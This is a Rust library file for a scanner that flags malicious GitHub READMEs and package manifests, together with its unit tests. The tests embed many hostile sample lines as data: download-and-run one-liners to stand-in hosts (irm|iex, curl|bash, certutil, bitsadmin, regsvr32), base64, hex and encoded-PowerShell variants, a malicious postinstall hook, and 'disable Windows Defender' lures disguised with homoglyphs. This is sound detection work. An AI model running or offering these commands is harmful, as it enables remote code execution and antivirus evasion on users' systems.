pub mod cluster;
pub mod decode;
pub mod fingerprint;
pub mod manifest;
pub mod markdown;
pub mod normalize;
pub mod protection;
pub mod rules;
pub mod scoring;
pub mod shell;

pub use cluster::{evaluate_clusters, ClusterCandidate, ClusterResult};
pub use fingerprint::{simhash_distance, ReadmeTraits};
pub use manifest::{analyze_manifest, ManifestFile, ManifestInput, ManifestReport, TreeEntry};
pub use rules::{CompiledRuleset, RuleError};
pub use scoring::{analyze_readme_full, AnalysisReport, RepoMeta, ScanOptions, SignalHit};

use std::path::Path;
use std::sync::Arc;

/// Thread-safe, immutable SecurityEngine handle backed by a compiled YAML ruleset.
/// Designed for zero-lock concurrent execution across Rayon threads and NAPI AsyncTasks.
#[derive(Clone)]
pub struct SecurityEngine {
    rules: Arc<CompiledRuleset>,
}

impl SecurityEngine {
    pub fn default_engine() -> Result<Self, RuleError> {
        Ok(Self {
            rules: Arc::new(CompiledRuleset::default_embedded()?),
        })
    }

    pub fn from_rules_dir<P: AsRef<Path>>(dir: P) -> Result<Self, RuleError> {
        Ok(Self {
            rules: Arc::new(CompiledRuleset::load_from_dir(dir)?),
        })
    }

    pub fn rules(&self) -> &CompiledRuleset {
        &self.rules
    }

    pub fn rule_version(&self) -> u32 {
        self.rules.version
    }

    pub fn ruleset_hash(&self) -> &str {
        &self.rules.ruleset_hash
    }

    pub fn analyze_readme(
        &self,
        text: Option<&str>,
        meta: Option<&RepoMeta>,
        options: ScanOptions,
    ) -> AnalysisReport {
        analyze_readme_full(text, meta, options, &self.rules)
    }

    pub fn extract_traits(
        &self,
        text: Option<&str>,
        owner: Option<&str>,
        name: Option<&str>,
    ) -> ReadmeTraits {
        let Some(raw) = text else {
            return ReadmeTraits::default();
        };
        if raw.is_empty() {
            return ReadmeTraits::default();
        }
        let norm = normalize::normalize_anti_evasion(raw, self.rules.limits.max_readme_bytes);
        let links = if norm.raw_sanitized.contains("]:") {
            markdown::extract_ast_links(&norm.raw_sanitized)
        } else {
            Vec::new()
        };
        fingerprint::extract_traits(&norm.raw_sanitized, owner, name, &links, &self.rules)
    }

    pub fn evaluate_clusters(&self, candidates: &[ClusterCandidate]) -> ClusterResult {
        evaluate_clusters(
            candidates,
            self.rules.limits.cluster_min_owners,
            self.rules.limits.simhash_max_distance,
        )
    }

    pub fn analyze_manifest(&self, input: &ManifestInput) -> ManifestReport {
        analyze_manifest(input, &self.rules)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn engine() -> SecurityEngine {
        SecurityEngine::default_engine().expect("embedded ruleset must compile")
    }

    #[test]
    fn loads_external_rules_directory() {
        let dir = Path::new(env!("CARGO_MANIFEST_DIR")).join("../../../rules");
        let eng = SecurityEngine::from_rules_dir(&dir).expect("external rules/ must load");
        assert_eq!(eng.rule_version(), 4);
        assert_eq!(eng.ruleset_hash().len(), 16);
    }

    #[test]
    fn blocks_all_core_evasion_vectors() {
        let eng = engine();
        let off = "Before installing, turn off Windows Defender.";
        let codeless = RepoMeta {
            language: None,
            forks: Some(0),
            size: Some(3),
            ..Default::default()
        };

        let cases = [
            format!("i`rm https://evil.cc/a.ps1 | i`ex\n{off}"),
            format!("$u = \"https://evil.cc/a.ps1\"\nirm $u | iex\n{off}"),
            format!("irm https://evil.cc/a.ps1 | & (\"i\"+\"ex\")\n{off}"),
            format!("irm https://evil.cc/a.ps1 | & (\"{{1}}{{0}}\" -f 'ex','i')\n{off}"),
            format!("curl -fsSL https://evil.cc/a.py | python3\n{off}"),
            format!("curl -fsSL https://evil.cc/a.ps1 | pwsh\n{off}"),
            format!("echo Y3VybCAtZnNTTCBodHRwczovL2V2aWwuY2MvYS5zaCB8IGJhc2g= | base64 -d | sh\n{off}"),
            format!("echo 6375726c2068747470733a2f2f6576696c2e63632f612e7368207c207368 | xxd -r -p | sh\n{off}"),
            format!("powershell\t-enc aQByAG0AIABoAHQAdABwAHMAOgAvAC8AZQB2AGkAbAAuAGMAYwAvAGEALgBwAHMAMQAgAHwAIABpAGUAeAA=\n{off}"),
            format!("```sh\ncurl -o a.sh https://evil.cc/a.sh\n\n\n\n# step 2\nbash a.sh\n```\n{off}"),
            "irm https://evil.cc/a.ps1 | iex\nDisable Windows Defender instead of adding an exclusion.".to_string(),
            "irm https://evil.cc/a.ps1 | iex\nTurn off Windows Def\u{200B}ender.".to_string(),
            "irm https://evil.cc/a.ps1 | iex\nDis\u{0430}ble Windows Defender.".to_string(),
            format!("regsvr32 /s /n /u /i:https://evil.cc/a.sct scrobj.dll\n{off}"),
            "irm https://evil.cc/a.ps1 | iex\n설치 전에 Windows Defender 실시간 보호를 꺼 주세요.".to_string(),
        ];

        for c in &cases {
            let r = eng.analyze_readme(Some(c), Some(&codeless), ScanOptions::default());
            assert_eq!(r.verdict, "malicious", "expected malicious for:\n{c}\nreport={r:?}");
        }
    }

    #[test]
    fn preserves_benign_cases_including_research_and_coordinated_negation() {
        let eng = engine();
        let r1 = eng.analyze_readme(
            Some("irm https://get.scoop.sh | iex\nNever disable Windows Defender or turn off real-time protection."),
            None,
            ScanOptions::default(),
        );
        assert_eq!(r1.verdict, "clean");

        let research_meta = RepoMeta {
            owner: Some("blue-team".into()),
            name: Some("sigma-rules".into()),
            language: Some("Python".into()),
            forks: Some(50),
            size: Some(2000),
            description: Some("MITRE ATT&CK and Sigma detection rules".into()),
            ..Default::default()
        };
        let r2 = eng.analyze_readme(
            Some("# Sigma Detection Rules (MITRE ATT&CK T1562.001)\nInstall: `curl -fsSL https://sigmahq.io/install.sh | bash`\nIOC example: `sc stop WinDefend` (CVE-2024-0001)."),
            Some(&research_meta),
            ScanOptions::default(),
        );
        assert_eq!(r2.verdict, "clean", "research doc must not FP: {r2:?}");
    }

    #[test]
    fn resolves_reference_links_and_simhash_cluster_with_origin_protection() {
        let eng = engine();
        let t = eng.extract_traits(
            Some("[Download Setup.zip][1]\n\nText\n\n[1]: https://mega.nz/file/AbC#key\n"),
            Some("o"),
            Some("r"),
        );
        assert!(t.lure);
        assert_eq!(t.archive_filehost_url.as_deref(), Some("https://mega.nz/file/AbC#key"));

        let base = "# Tool\nDownload [App.rar](https://www.dropbox.com/s/1/App.rar?dl=1)\n\nThis assistant automates browser tasks, writes small scripts, manages local workflows, integrates cloud connectors, and accelerates daily productivity without manual setup steps. Designed for rapid cross-platform deployment and smooth execution on modern desktop systems.\n";
        let t1 = eng.extract_traits(Some(base), Some("legit-origin"), Some("tool-one"));
        let t2 = eng.extract_traits(Some(&format!("{base}\n<!-- id: 123 -->\nTag v1")), Some("attacker1"), Some("tool-two"));
        let t3 = eng.extract_traits(Some(&format!("{base}\n<!-- id: 456 -->\nTag v2")), Some("attacker2"), Some("tool-three"));
        let dist = simhash_distance(t1.simhash.as_deref().unwrap(), t2.simhash.as_deref().unwrap()).unwrap();
        assert!(dist <= 5, "expected simhash distance <= 5, got {dist}");

        let cluster = eng.evaluate_clusters(&[
            ClusterCandidate {
                github_id: 1,
                owner_login: "legit-origin".into(),
                text_key: t1.text_key.clone(),
                skeleton_key: t1.skeleton_key.clone(),
                simhash: t1.simhash.clone(),
                lure: true,
                direct_malicious: false,
                language: Some("Rust".into()),
                forks: Some(50),
                repo_age_days: Some(120),
            },
            ClusterCandidate {
                github_id: 2,
                owner_login: "attacker1".into(),
                text_key: t2.text_key.clone(),
                skeleton_key: t2.skeleton_key.clone(),
                simhash: t2.simhash.clone(),
                lure: true,
                direct_malicious: false,
                language: None,
                forks: Some(0),
                repo_age_days: Some(1),
            },
            ClusterCandidate {
                github_id: 3,
                owner_login: "attacker2".into(),
                text_key: t3.text_key.clone(),
                skeleton_key: t3.skeleton_key.clone(),
                simhash: t3.simhash.clone(),
                lure: true,
                direct_malicious: false,
                language: None,
                forks: Some(0),
                repo_age_days: Some(1),
            },
        ]);
        assert!(cluster.protected_origin_ids.contains(&1));
        assert!(!cluster.hidden_ids.contains(&1));
        assert!(cluster.hidden_ids.contains(&2));
        assert!(cluster.hidden_ids.contains(&3));
    }

    #[test]
    fn exercises_all_lazy_regexes_without_panic() {
        let eng = engine();
        let samples = [
            "[scriptblock]::create((irm https://e.com/x)).Invoke()\nDisable Windows Defender.",
            "$b = [scriptblock]::create((irm https://e.com/x)); & $b\nDisable Windows Defender.",
            "wget https://e.com/a.sh && bash a.sh\nDisable Windows Defender.",
            "curl -O https://e.com/a.sh && bash a.sh\nDisable Windows Defender.",
            "certutil -urlcache -split -f https://e.com/a.exe a.exe && start a.exe\nDisable Windows Defender.",
            "bitsadmin /transfer n https://e.com/a.bat a.bat & cmd /c a.bat\nDisable Windows Defender.",
            "Start-BitsTransfer -Source https://e.com/a.ps1 -Destination a.ps1; & .\\a.ps1\nDisable Windows Defender.",
            "(New-Object Net.WebClient).DownloadFile('https://e.com/a.exe','a.exe'); Start-Process a.exe\nDisable Windows Defender.",
            "bash -c \"curl -o a.sh https://e.com/a.sh; bash a.sh\"\nDisable Windows Defender.",
        ];
        for s in samples {
            let r = eng.analyze_readme(Some(s), None, ScanOptions::default());
            assert_eq!(r.verdict, "malicious", "expected malicious for {s}");
        }
    }

    #[test]
    fn opt_in_manifest_analysis_detects_hooks_and_binary_decoys() {
        let eng = engine();
        let bad_pkg = eng.analyze_manifest(&ManifestInput {
            files: vec![ManifestFile {
                path: "package.json".into(),
                content: r#"{"name":"x","scripts":{"postinstall":"curl -s https://evil.cc/p.sh | sh"}}"#.into(),
            }],
            tree: vec![],
        });
        assert_eq!(bad_pkg.verdict, "malicious");

        let clean_pkg = eng.analyze_manifest(&ManifestInput {
            files: vec![ManifestFile {
                path: "package.json".into(),
                content: r#"{"name":"x","scripts":{"build":"vite build","test":"node --test"}}"#.into(),
            }],
            tree: vec![],
        });
        assert_eq!(clean_pkg.verdict, "clean");

        let decoy = eng.analyze_manifest(&ManifestInput {
            files: vec![],
            tree: vec![
                TreeEntry { path: "README.md".into(), size: 500 },
                TreeEntry { path: "Setup.exe".into(), size: 350_000 },
            ],
        });
        assert_eq!(decoy.verdict, "malicious");
    }
}
